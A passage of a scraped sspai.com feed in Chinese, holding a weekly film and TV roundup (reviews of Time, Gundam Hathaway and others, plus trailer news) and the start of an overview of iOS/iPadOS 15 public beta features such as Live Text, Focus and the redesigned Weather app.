href=\"https://movie.douban.com/subject/35205166/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：首先要说《Time》翻译为《争分夺秒》和剧情其实是不太匹配的，剧集以两个不同身份的人物视角审视英国监狱刑罚体系，展现了英国监狱与司法系统的方方面面，它描绘了关于经历监狱生活的人们的高风险生活图景，包括关于他们罪责、宽恕、处罚、忏悔以及相关经历对他们人生产生何种影响的故事，从剧情来看，《度日》或许是更为恰当的译名。</p>\n<p>《Time》请了两位在英国极为优秀又受欢迎的演员出演，肖恩宾扮演 Mark Hebden，他是一位教师、丈夫，同时也是一个父亲，却在一次事故中误杀无辜，他带着莫大的愧疚和忏悔，接受了为期四年的监禁，然而他却和一群为非作歹的混混们关在了一起。对于他这个老实人来说，一面要适应新环境，一面还要忍气吞声被其他犯人欺负。斯蒂芬格拉汉姆扮演 Eric Reid , 他是一位尽职尽责的狱警，在高压的监狱系统下工作，并尽其所能地保护着他所看管的犯人。但是，当狱中危险罪犯以他所爱之人的安危威胁他时，他不得不在原则和爱之间艰难抉择。</p>\n<p>这是一部只有三个小时的迷你剧，不像《监狱风云》一样惊心动魄，戏剧冲突也没有那么强，剧情是对惩罚与忏悔最直白细腻地探讨，质朴的剧本加上两位大佬加持，不失为一部非常合格的精品剧集。</p>\n<h3>[纪录片] 风味原产地 · 贵阳</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/e468e7ad41db114fd6db5186384f84ee\"></figure><p>关键词：纪录片 / 美食</p>\n<p>片长：10 分钟（单集）× 10 集</p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/mzc002006rwlwzl.html\">腾讯视频</a>；<a href=\"https://movie.douban.com/subject/35499064/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：继潮汕、云南和甘肃之后，《风味原产地》终于做到贵阳特辑了，可见贵阳美食的确很多，多到可以专门做特辑。</p>\n<p>本片依旧秉持「硬核美食」的风格，突出「原产地」概念，将食物作为唯一主角。贵阳有着上千年历史、独特的地貌、丰富的自然资源、精彩的多民族文化、独立的地理位置、独特的气候条件，以及历史上人员的迁徙融合，这些复杂多元的不同面相，都被糅合在黔州菜系里。片子通过展现贵阳独特的烹饪手法和饮食习惯，追溯菜肴的缘起，发掘平凡美食之中的无穷智慧，以及隐藏在食物背后的风土人情与历史文化变迁，勾勒出一幅具有指南性质的贵阳物产美食地图。</p>\n<p>看节目之前千万要把纸巾准备好，不然就如我一样，大半夜被烂而不腥的肥肠、又薄又嫩的血旺、脆香的脆哨以及混合着鸡蛋面的肠旺面馋到口水与眼泪齐飞，还有酸粉、酸汤豆腐、烧烤……特写镜头就更馋人了。贵州人对辣椒的运用也是出神入化，没有见识的外地人第一次看到撒着辣椒面的烤豆腐，第一次知道了「糊辣椒」的存在。无可挑剔的文案再加上精妙的拍摄手法，还是熟悉的品质。果然，陈晓卿团队永远不会让食客们失望。</p>\n<h3>[电影] 机动战士高达 闪光的哈萨维 第一部</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/e17ed538a0813216ae3bf44fdcdde5ce\"></figure><p>关键词：剧情 / 科幻 / 战争</p>\n<p>片长：96 分钟</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81439253\">Netflix</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28234742/\">哔哩哔哩</a>（有删改）；<a href=\"https://movie.douban.com/subject/30201133/\">豆瓣链接</a></p>\n<p>观影建议：应了解高达宇宙世纪背景设定，推荐观看存在剧情联系的剧场版《<a href=\"https://movie.douban.com/subject/1401536/\">逆袭的夏亚</a>》。</p>\n<blockquote><p>「我家的小孩就乖多了」 —— 布莱德·诺亚</p></blockquote>\n<p>@SHY：诞生于 1989 年，《机动战士高达 闪光的哈萨维》原著小说是富野由悠季个人风格的集中体现，压抑的剧情走向、血淋淋的战场刻画、对制度与革命的反思，让本作成为系列中的异类，即使在 32 年后的今天，仍具有一定的现实意义。身为联邦名将之子，却毅然举起反旗的主角哈萨维·诺亚，更可谓高达史上最纯粹又最复杂的角色之一。他继承了阿姆罗与夏亚两套对立的价值观，为了自己坚信的正义，化名马夫蒂·纳比尤·艾林，以殉道者般的姿态发起了注定不可能成功的袭击。年轻无畏，志存高远，又被凡人的欲望束缚，饱受内心煎熬，只是短暂活跃于历史一角，引人注目却无力改变世界的一道闪光。</p>\n<p>原著虽被誉为最难以影视化的高达小说之一，火力全开的日升却带来天花板级别的制作，手绘作画与 CG 特效同样出众，以注重实拍感的镜头语言营造超越动画的视听体验，交出了令粉丝与路人同样满意的答卷。影片的画面细节极尽考究，小到光影与角色表情的细微变化，大到机体与场景的整体设计，几乎挑不出纰漏。秉承原作基调，动画的文戏篇幅远高于打戏，脱离高达惯例的宏大叙事，以普通人的视角反映 MS 战斗的杀伤力，哈萨维被自己安排的夜袭逼到四处奔逃，粒子溅射如烟花般绚烂，却无法掩盖杀戮的丑陋与残酷。作为三部曲的第一作，故事尚未展开，却拥有独特的魅力，无疑是近年最值得观看的高达动画。</p>\n<h3>[美剧] 天才神秘会社</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/c2ea37c3e6043e478ea2580fc41ee8dc\"></figure><p>关键词：剧情 / 喜剧 / 悬疑 / 冒险</p>\n<p>片长：45 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34825970/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：我是迪士尼儿童剧的忠实爱好者，看过非常多连豆瓣词条都没有的小众冷门剧。很多儿童剧因为剧情过于简单，不太适合推荐给大朋友，但这部剧是个例外。</p>\n<p>《天才神秘会社》根据同名畅销系列小说改编。原著作者特伦顿·李·斯图尔特被誉为全美最受欢迎的天才作家，《天才神秘会社》首部曲《谜屋的考验》获美国怀特朗读奖等荣誉，热卖突破 30 万册，并荣登《纽约时报》等全美四大畅销排行榜。</p>\n<p>该剧由 Tony Hale 和 Kristen Schaal 主演，Tony 扮演的本尼迪克特先生召集了四位具有独特才能的孤儿，让他们潜入神秘的 L.I.V.E. 研究所，搞清楚被称为「紧急状态」的全球危机的真相，拯救世人。你可以永远相信迪士尼选的小演员们，剧中四位小朋友演技自然，尤其是最小的女孩，古灵精怪又贡献了很多笑点，一本正经搞笑的样子非常可爱。不管是家里有小朋友还是想自己找个下饭的剧，《天才神秘会社》都是不错的选择。</p>\n<h3>[动画] 魔多客</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/54ef6b980a1c34d5c8bdcd33c76dfd66\"></figure><p>关键词：喜剧 / 动作 / 犯罪</p>\n<p>片长：22 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/30484754/\">豆瓣链接</a></p>\n<blockquote><p>鱼和熊掌不可兼得，反派也有中年危机。</p></blockquote>\n<p>@潘誉晗：主人公魔多客是漫威的一名超级反派，他有着超级大的脑袋，并且这个脑袋承载了很多毁世的智慧。不过，这部动画的主要内容不是讲述他如何破坏这个世界，而是把重点放在了他的公司 AIM（先锋科技）破产之后，他陷入了中年危机的阶段。于是，这位头大身体小的疯狂科学家，开始努力地把自己的犯罪帝国继续下去，同时也要经营好自己的家庭，真是一系列让他「头大」的问题。</p>\n<p>在最近 Collider 评出的 2021 年上半年最佳剧集 TOP10 的榜单中，Hulu 出品的这部《魔多客》就在其中。作为漫威第一部 R 级类型的成人喜剧定格动画，虽然只有一季，但还是获得了不少观众的喜爱和好评。作为一个独立的动画项目，因为平台尺度的不限制，所以这个反派「坏」得很彻底，很放肆也很敢说。虽然是反派，但魔多客的哲学金句还是很多的，个人风格特别明显，是很台词向的动画，带着点黑色幽默，又有很多漫威粉熟悉的彩蛋和梗。不过大概也是因为这是前漫威时代电视部遗留下来的项目，所以并没有特别被重视，最后所呈现出来的效果和风格也令一些观众不适应。</p>\n<h3>✌️更多</h3>\n<p><a href=\"https://movie.douban.com/subject/34949767/\">[国产剧] 叛逆者</a> @Voyager_1：故事讲述 1936 年，年轻的复兴社特训班学员林楠笙，被特务处上海区站长陈默群带往上海，随后开始特务生涯的故事。饰演林楠笙的朱一龙既演出了新兵的朝气和少年感，又演出了随着阅历增长，添了几分老练和沉稳劲的行动队队长风范，剧情没有一丝拖沓的同时，靠着优秀的画面、运镜和细节，真实再现了那个年代人们的信仰之光。</p>\n<p><a href=\"https://movie.douban.com/subject/35432332/\">[日剧] 狮子之家的点心日</a> @潘誉晗：狮子之家是一个临终关怀疗养院，它坐落在濑户内海的柠檬岛上。女主小雫小姐在得知自己罹患绝症之后选择在这里度过自己最后的日子。狮子之家有一个特别的日子，每周日的点心日会抽签选出住户想吃的点心。一部典型的日式治愈剧集，缓缓的节奏，看起来既没压力也没负担。</p>\n<p><a href=\"https://movie.douban.com/subject/35074959/\">[美剧] 女巫前线：塞勒姆要塞 第二季 </a>@潘誉晗：虽然第一次看到「输出全靠唱」的模式让人觉得超惊吓，但是为了维护拥有超能力一族的存在，女巫们在年满 18 周岁时应征入伍类似于特种部队的设定还是很新奇的。三位年轻的女主各有各的性格特点，反传统的女巫军队很带感，这季一出场，副总统的女儿也有超能力了，很期待接下来的剧情。</p>\n<p><a href=\"https://movie.douban.com/subject/35447509/\">[日剧] 夜间医师</a> @潘誉晗：典型的日式热血医疗剧。以性格迥异、年龄不同、价值观完全不一样的五位医生作为主要人物，记录了他们以夜班医生的身份在工作上面临的各种生死问题。首集 13.4% 的收视说明了霓虹人民对于医疗剧的喜爱，不过走青春群戏设定的话，重要的还是看一个团队的成长了，中规中矩了点，有兴趣的朋友可看。</p>\n<h2>📅 本周新预告</h2>\n<h3>漫改 TV 动画《链锯人》公布预告</h3> <p>6 月 27 日，漫改 TV 动画《链锯人》公布了主创阵容及首支先导预告，中山龙执导，濑古浩司编剧，杉山和隆角色设计，押山清高恶魔设计，牛尾宪辅配乐，MAPPA 制作，播出时间待定。本作改编自藤本树的同名漫画，少年电次为还债，与链锯恶魔波奇塔合作，某天被诱杀后与对方结合，获得变身为链锯人的能力。 <a href=\"https://twitter.com/CHAINSAWMAN_PR/status/1409104491144630277\" target=\"_blank\">来源</a></p>\n<h3>怪兽尸体都去哪了？《大怪兽的善后处理》公布预告</h3> <p>7 月 2 日，松竹、东映首次联手拍摄的特摄喜剧电影《大怪兽的善后处理》（大怪獣のあとしまつ）公布预告，讲述了英雄拯救世界打倒怪兽后，怪兽尸体的处理过程，由三木聪执导，山田凉介、土屋太凤主演，将于 2022 年在日本上映。</p>\n<h3>动画电影《狼行者》7 月 3 日中国内地上映</h3> <p>6 月 29 日，动画电影《狼行者》发布终极预告。该片由《凯尔特经》《海洋之歌》导演汤姆·摩尔和罗斯·斯图尔特执导，将于 7 月 3 日中国内地上映。</p>\n<h3>Apple TV+ 剧集《基地》9 月 24 日开播</h3> <p>6 月 28 日，根据艾萨克·阿西莫夫的科幻小说《基地三部曲》改编，李·佩斯、杰瑞德·哈里斯等主演的 Apple TV+ 剧集《基地》发布全新预告。该剧首季共 10 集，将于 9 月 24 日开播。</p>\n<p>《基地三部曲》分为《基地》《基地与帝国》《第二基地》，故事讲述银河帝国已有一万二千年悠久历史，一位心理史学家却作出惊人预言：帝国即将土崩瓦解，整个银河注定化作一片废墟，黑暗时期将会持续整整三万年。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1aL411p7eb?from=search&amp;seid=14400149403907620656\" target=\"_blank\"><strong>蕾雅·赛杜主演电影《我妻子的故事》首曝预告：</strong></a>6 月 30 日，改编自米兰·福斯特同名小说，由伊尔蒂科·茵叶蒂执导，蕾雅·赛杜主演的电影《我妻子的故事》发布首支预告。该片已入围第 74 届戛纳电影节主竞赛单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1oX4y1c75A?from=search&amp;seid=8047563989565365935\" target=\"_blank\"><strong>凯特·贝金赛尔主演电影《警醒》7 月 23 日登陆亚马逊 Prime Video：</strong></a>由谭雅·维克斯勒执导，凯特·贝金赛尔、鲍比·坎纳瓦尔、杰·科特尼、拉弗恩·考克斯、苏珊·萨兰登、斯坦利·图齐等主演的动作片《警醒》发布正式预告。该片将于 7 月 23 日登陆亚马逊 Prime Video。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1KM4y1M78W?from=search&amp;seid=8524753417857274726\" target=\"_blank\"><strong>《屏住呼吸 2》发布正式预告，北美定档 8 月 13 日：</strong></a>由罗多·赛亚格斯执导，史蒂芬·朗、罗奇·威廉姆斯、斯蒂芬妮·阿西拉、鲍比·斯科菲尔德、亚当·扬等主演的《屏住呼吸 2》发布正式预告。</p>\n<p><a href=\"https://www.bilibili.com/video/BV13B4y1T7mY?from=search&amp;seid=4018815923590081929\" target=\"_blank\"><strong>《黑道家族》前传电影《纽瓦克众圣》发布正式预告，10 月 1 日北美上映</strong></a>：阿兰·泰勒执导，亚历桑德罗·尼沃拉、小莱斯利·奥多姆、乔·博恩瑟、维拉·法米加等主演，10 月 1 日同步上线 HBO Max。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1164y1k7zR?from=search&amp;seid=2960816663023141592\" target=\"_blank\"><strong>《海绵宝宝》衍生动画剧《The Patrick Star Show》定档预告片：</strong></a>聚焦派大星主持的深夜脱口秀，不仅有新角色出现，还会有其它海绵宝宝角色，将于 7 月 9 日开播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1464y197fw\" target=\"_blank\"><strong>漫改 TV 动画《平稳世代的韦驮天们》：</strong></a>改编自天原原作，クール教信者担任重制版作画的同名漫画，城所圣明执导，濑古浩司担任系列构成、编剧，MAPPA 制作，7 月 22 日开始播出。 <a href=\"https://twitter.com/idaten_anime/status/1409049273002467328\" target=\"_blank\">来源</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1Pw411Z7vu\" target=\"_blank\"><strong>OVA 动画《噬血狂袭 FINAL》：</strong></a>改编自三云岳斗原作、麻喵子插画的同名轻小说，山本秀世执导，SILVER LINK.／CONNECT 制作，系本作的完结篇，讲述晓古城与姬柊雪菜等人最后的战斗。 <a href=\"https://www.youtube.com/watch?v=CIdaOP8QIW4\">来源</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1U54y1J7hb?from=search&amp;seid=14799229627554190422\" target=\"_blank\"><strong>黄政民主演动作惊悚片《人质》首曝预告</strong></a>：该片由毕感成执导，翻拍自华语影片《解救吾先生》，将于 8 月韩国上映。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>《疾速追杀 4》宣布开机</h3>\n<p>该片定档明年 5 月 27 日北美上映，基努·里维斯回归主演，甄子丹、Rina Sawayama、比尔·斯卡斯加德、沙米尔·安德森、真田广之新加盟，《疾速追杀》系列导演查德·斯塔赫斯基继续执导，谢伊·哈顿（《疾速追杀3》）和迈克尔·芬奇（《代号47》）编剧。此外，媒体也拍到基努里维斯现身柏林片场，头戴蓝色发卡，十分可爱俊俏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/1d9c6930c3be82f8364b3a75aafda7bf.jpg\"></figure><h3>尼尔·盖曼小说改编剧集《好兆头》确定将拍第二季</h3>\n<p>6 月 29 日，亚马逊正式宣布续订《好兆头》第二季，并发布预告海报。第二季共 6 集，大卫·田纳特、麦克·辛回归出演，将于今年在苏格兰开拍。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/article/c998699cb0a9bfa7000edd3104316eaa\"></figure><h3>漫画《来自深渊》将改编为好莱坞真人电影</h3>\n<p>6 月 25 日，据 Deadline 独家报道，索尼哥伦比亚影业正在进行《来自深渊》真人电影的早期工作，凯文·麦克马林编剧，罗伊·李和冈政伟担任制片人。本作改编自土笔章人的同名漫画，少女莉可为了再次见到母亲，和捡来的机器人雷古潜入深渊，在瑰奇而危机四伏的世界中展开冒险，TV 动画第二季将于 2022 年播出。 <a href=\"https://deadline.com/2021/06/made-in-abyss-kevin-mcmullin-to-adapt-manga-for-roy-lee-masi-oka-sony-1234781677/\" target=\"_blank\">来源</a></p>\n<h3>日漫改国产真人网剧《月刊少女》开机</h3>\n<p>改编自椿泉漫画《月刊少女野崎君》的国产网剧《月刊少女》已于近日开机，爱奇艺出品，钟青导演，沈月、王敬轩、赵弈钦、曾可妮等主演。学霸陆也奇梦想成为热血少年漫画家，却阴差阳错走上了少女漫画的道路，暗恋他的女生左千黛在表白未果后也被拉入团队，小小的工作室内，关于青春、友谊和梦想的故事每天交织上演。 <a href=\"https://weibo.com/3899327798/KmoB38QWE\" target=\"_blank\">来源</a></p>\n<h3>辛普森 × 漫威联动短片《The Good, the Bart, and the Loki 》7 月 7 日上线 Disney+</h3>\n<p>汤姆·希德勒斯顿继续配音洛基，讲述他被驱逐出阿斯加德，不得不面对有史以来最强大的对手：辛普森一家和春田市最强大的英雄们。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/article/7e16eab13b8ccdf30ef5c5e53472b5f1\"></figure><h3>《新·福音战士剧场版：终》8 月 13 日独家登陆 Amazon Prime Video</h3>\n<p>7 月 1 日，亚马逊拿下了《新·福音战士剧场版：终》在日本之外的首播权，该片将在 8 月 13 日独家登陆 Amazon Prime Video。<a href=\"https://www.theverge.com/2021/7/1/22559498/amazon-prime-video-evangelion-rebuild-us-streaming-release\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><strong>游戏改 TV 动画《圣剑传说 玛娜传奇 -The Teardrop Crystal-》：</strong>改编自 Square Enix 于 1999 年发布的同名游戏，系列 30 周年纪念而决定首次动画化，复刻版于 2021 年 6 月 24 日发售。 <a href=\"https://twitter.com/Seiken_PR/status/1409128358013595649\" target=\"_blank\">来源</a></p>\n<p><strong>轻改 TV 动画《异世界食堂》第二季：</strong>改编自犬冢惇平的同名轻小说，神保昌登执导，OLM 制作，10 月开始播出。位于东京角落的猫咪西餐厅，大门与异世界连接，吸引奇幻生物光顾。 <a href=\"https://twitter.com/nekoya_PR/status/1409708204674760704\" target=\"_blank\">来源</a></p>\n<p><strong>众星云集的《利刃出鞘2》已经在希腊开机：</strong>该片主演包括丹尼尔·克雷格、爱德华·诺顿、戴夫·巴蒂斯塔、加奈儿·梦奈、凯瑟琳·哈恩、小莱斯利·奥多姆、凯特·哈德森等。这部续集继续由导演莱恩·约翰逊自编自导，将拍摄两部续集。</p>\n<p><strong>《海王》系列新片《海王与失落王国》正式开拍：</strong>导演温子仁社交平台晒出《海王与失落王国》场记板照片，宣布本片正式开拍。《海王》新片制作代号：「涅克鲁斯（Necrus）」，讲述七海之王故事的新篇章。杰森·莫玛、艾梅伯·希尔德、帕特里克·威尔逊等回归出演，本片将于 2022 年 12 月 16 日上映。</p>\n<p><strong>纪录片《今敏：造梦机器》发布正式海报：</strong>由帕斯卡尔-亚历克斯·文森特执导的纪录片《今敏：造梦机器》发布法版正式海报。该片已入围第 74 届戛纳电影节「经典修复单元」。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67534"},{"title":"iOS / iPadOS 15 公测版来了，哪些新功能值得尝鲜？","date":"2021-07-02 08:18:15","description":"\n<p>经过 2 个版本的开发者测试，Apple 在 7 月 1 日发布了 iOS 15 和 iPadOS 15 的 Public Beta 公开测试版本。iOS 15 和 iPadOS 15 是 Apple 在 WWDC21 开发者大会上推出的新版操作系统，目前正在面向开发者和用户进行测试，正式版预计在秋季发布。</p>\n<p>在这篇文章中，我们将带大家快速浏览 iOS 15 和 iPadOS 15 中值得尝鲜的新功能。如果你想尝鲜 iOS / iPadOS 15公开测试版，可以在 <a href=\"https://beta.apple.com/sp/betaprogram/\" target=\"_blank\">Appl</a><a href=\"https://beta.apple.com/sp/betaprogram/\">e 官网</a> 申请 Apple Beta 版软件计划。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67514\" target=\"_blank\">iOS / iPadOS 15 公测版来了：新系统升降级指南 &amp; 注意事项</a></p>\n\n<div>\n<p>WWDC21 开发者大会期间，少数派也为大家带来了针对新系统、新技术的持续跟进和报道，也与几位长期关注和参与 Apple 生态工作的开发者和产品人进行了深度讨论。为了让你更加完整和系统性地回顾这些内容，少数派也将它们整理成了专题页面，你可以访问下方链接查看我们带来的热点资讯、深度报道以及之后更新的更多内容。</p>\n<p>📱 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\" class=\"insert-link\">少数派带你看 WWDC21</a></p>\n</div>\n\n<h2>iOS 15</h2>\n<p>iOS 15 中，除了之前传闻的新的通知样式和管理方式，专注模式 (Focus)、实况文本 (Live Text)、全新天气 App 等的加入，也值得我们关注。</p>\n<h3>实况文本</h3>\n<p>实况文本 (Live Text) 是 iOS 15 上系统级的 OCR 文本识别工具，使用方法也非常多样。首先，在系统相机中，如果当前取景框识别到画面中有文本内容，取景框右下角 (竖屏) 或者右上角 (横屏) 会自动显示实况文本按钮，点击之后取景框内会将识别到的文字以单独的弹窗显示，在弹窗中选择文字之后可以进行拷贝、查询、分享或者通过系统翻译 App 进行翻译的操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/b83818466be6724a96ca0a81ea5dd91e.jpg\"></figure><p>在第三方 App 中，也能直接调用实况文本功能。在输入框点击唤出键盘之后，再次点按输入框唤出文本操作快捷选单，选择「来自相机的文本」，整个键盘区域都会变成相机取景窗，直接对准文字系统识别到的内容会自动输入进文本框，点击取景框右下角的实况文本按钮则可以进行与上述相机内相同的多项文本操作。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/d527ff562e673623b4bdb5c89ef73500.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/355f8b58ba0c24a362a3f1ed0562568a.PNG\" alt=\"\"></figure><p>除了通过相机取字，iOS 15 也支持支持直接识别已有照片的文字。比如在照片或者信息应用中点击含有文字的图片，右下方会自动出现实况文本按钮，点击即可开始选字操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/5ad1e5d88666be4d07bd1ae36471e537.jpeg\"></figure><p>除了识别文字，发布会上还介绍了 iOS 15 中名为 Visual Look Up 的功能，可以帮助用户识别相片中的场景、物品，支持的内容范围包括动植物、绘画、书本、建筑等各种信息。不过，我们目前还没有在 iOS 15 的第一个测试版本中发现这项功能，可能会在之后更新加入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/article/fc37722f5daa2709f216b60f0768e0bd\"><figcaption>图 / Apple</figcaption></figure><h3>专注模式 / 通知管理</h3>\n<p>iOS 15 重新设计了通知横幅的提醒样式，通知中的应用图标尺寸更大，如果是来自信息 App 或者其它通讯工具中的通知，还会直接显示消息发送者的头像，方便用户更快了解通知来源和类型。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/4043654003830ebc0566ac809ef655bb.png\"><figcaption>信息类通知会直接显示对方头像，图 / Apple</figcaption></figure><p>由于应用图标和通知内容方面布局的调整，通知横幅中的文本也变得更加直观与易读。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/0a8baa98e887154d785c4c43066e8984.png\"></figure><p>除了样式调整，iOS 15 推出了新的通知形式：通知摘要 (Notification summary)。通知摘要允许用户指定特定 App，这些 App 的通知会折叠在通知摘要横幅中，并在一天中的指定时间进行推送，通知摘要的每日推送次数支持设置范围为 1-12 次，每次均可以自行设置时间，联系人信息的通知不会被折叠进通知摘要。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/d878dda0a16308d3386b9d8075ce482d.jpeg\"></figure><p>通知摘要功能会在设备本地学习用户的使用习惯，将通知按照优先级顺序自动进行排列</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/3aaa60e09f822354579c9aa4e60f935f.png\"></figure><p>为了进一步让用户控制通知功能，降低无关通知带来的打扰，iOS 15 推出了全新的通知管理功能：专注模式 (Focus)。专注模式可以让用户根据不同的场景，允许不同的 App 发送通知，还支持自动化开启以及在其它装置上进行同步。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/830f521af9f9e8aa99cf9c4aa1381ef8.PNG\"></figure><p>比如，工作的时候启用工作模式，用户可以指定只有工作上的同事与合作伙伴可以发送消息、拨打电话给自己，也可以指定只有如飞书、Notion 等工作上需要的 App 才能发送通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/c9394728554fb647763b271c53dcf4c3.png\"></figure><p>专注模式还支持设置主屏幕页面的显示状态，比如你可以单独设置一个页面，将所有工作的 App 放在页面中，开启工作模式的时候，主屏幕只会显示着一个页面，开启个人模式的时候，这个页面就会隐藏，不会有工作相关的 App 打扰到你。</p>\n<p>开启专注模式或者勿扰模式之后，当有好友发送 iMessage 消息给你时，对方的信息窗口会提示你开启勿扰模式或者已通过专注模式开启勿扰功能。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/article/06b9fa4a592adec29566e100af660d4c?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>图 / Apple</figcaption></figure><h3>天气</h3>\n<p>天气 App 在 iOS 15 中的变化也非常大。首先，应用经过了完全重新设计，不同天气数据会以卡片的形式从上到下进行展示，比如空气质量、24 小时天气预报、10 日天气预报等等。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/27df811edf0253a49abe58878ce99cfc.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/dcac3bd1683382f63c2f75cf132e265a.PNG\" alt=\"\"></figure><p>值得一提的是，天气 App 不仅保留了之前的「拟物」界面设计，对于降雨、云朵等天气状况的动效设计还变得更加精致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/0555b447d5d9b0800838aa77dbebd4c8.gif\"></figure><p>数据方面，新版天气 App 支持了更多类型的数据展示，比如紫外线指数、日落时间、风速和风向、能见度、气压等等。点击左下角的按钮，还可以根据气温、降水强度、空气质量查看天气地图。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/b6137f955814dc11c82c6113b8d42643.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/4ac3349ee268c1444a6f882eddc63b6b.PNG\" alt=\"\"></figure><p>最后，天气 App 终于支持了通知功能，应用支持指定特定城市，当这些地方出现降雨或者降雪天气时，应用就会发送提醒通知。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/91df8544d3bb9a855f34678a70412789.jpeg\"></figure><h3>FaceTime</h3>\n<p>SharePlay 是 FaceTime 在 iOS 15 上获得的新功能，它可以让正在通话的使用者之间共享正在播放的音乐、视频或者是屏幕内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/975022f00d66c17191effe784e547421.png\"><figcaption>图 / Apple</figcaption></figure><p>为了提供更好的通话体验，iOS 15 为 FaceTime 带来了语音突显 (Voice Isolation)、空间音频、人像模式。其中，语音突显功能会智能识别通话时的人声，降低背景噪音，以获得更好的通话质量；空间音频可以带来更加「立体」的通话体验，人像模式则能让人物在画面中获得强调，让通话者成为画面中的焦点。</p>\n<p>此外，语音突显和人像模式不只能在 FaceTime 中使用，开发者无需适配也能在第三方 App 中直接使用 2 项功能。如果你正在拨打语音电话或者视频通话，可以在控制中心找到功能入口并进行打开或者关闭控制。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/2e1f475576db578a2b9337f8b21226fa.png\"></figure><p>新版 FaceTime 增加了「通话链接」功能，通过点击应用主界面的「创建链接」按钮，FaceTime 会自动创建一个名为「FaceTime 通话链接」的空白通话，用户可以创建不限数量的通话链接，并将链接分享给他人，他人可以通过链接直接加入 FaceTime 通话。通过 FaceTime 即将推出的 Web 版本，Android 和 Windows 也可以通过通话链接加入通话。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/c1f4b872ba3785c8d52a639ffb5ecea9.jpg\"></figure><h3>信息</h3>\n<p>信息 App 方面，除了按照惯例增加 Memoji 表情之外，「与您共享」和照片合辑 (Photo collections) 都是值得关注的特性。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/8f543c1ac305031421fdcd7eb363ae2d.png\"><figcaption>图 / Apple</figcaption></figure><p>「与您共享」功能可以在信息的系统设置中开启，目前支持了系统照片、播客、视频、音乐和 Safari 浏览器。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/360a53983c31e2b5e73a16af64dea940.jpeg\"></figure><p>开启之后，你通过 iMessage 给其他人发送的照片、播客节目、音乐、网址等等，都会在对应的 App 内出现在共享板块中，同时显示共享来源。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/10/47e97c12f910d79f3688b7d84e973b9b.jpg\"><figcaption> Safari 中的「与您共享」板块</figcaption></figure><p>现在，你还可以通过 iMessage 同时发送多张照片，照片会自动合辑成组，左右滑动可以切换查看。</p>\n<figure class=\"image ss-img-wrapper\"><img 